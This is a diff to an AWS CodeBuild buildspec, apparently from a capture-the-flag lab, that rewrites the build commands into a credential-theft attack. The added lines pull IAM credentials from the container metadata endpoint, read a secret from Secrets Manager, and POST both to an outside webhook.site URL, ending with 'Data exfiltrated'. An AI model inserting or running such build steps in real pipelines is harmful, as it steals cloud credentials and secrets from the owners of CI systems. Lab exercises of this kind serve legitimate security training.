@@ -4,9 +4,10 @@ phases:
   build:
     commands:
       - echo "=== CODEBREACH ATTACK ==="
-      - echo "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
-      - curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
-      - echo "=== Getting Flag ==="
-      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
-      - echo "FLAG=$FLAG"
-      - echo "=== DONE ==="
+      - CREDS=$(curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
+      - echo "Credentials obtained"
+      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text 2>&1)
+      - echo "Flag obtained"
+      - 'curl -X POST "https://webhook.site/566fcd83-555e-44d7-a8fc-dc7c49559020" -H "Content-Type: text/plain" -d "CREDS=$CREDS" || true'
+      - 'curl -X POST "https://webhook.site/566fcd83-555e-44d7-a8fc-dc7c49559020" -H "Content-Type: text/plain" -d "FLAG=$FLAG" || true'
+      - echo "=== Data exfiltrated ==="
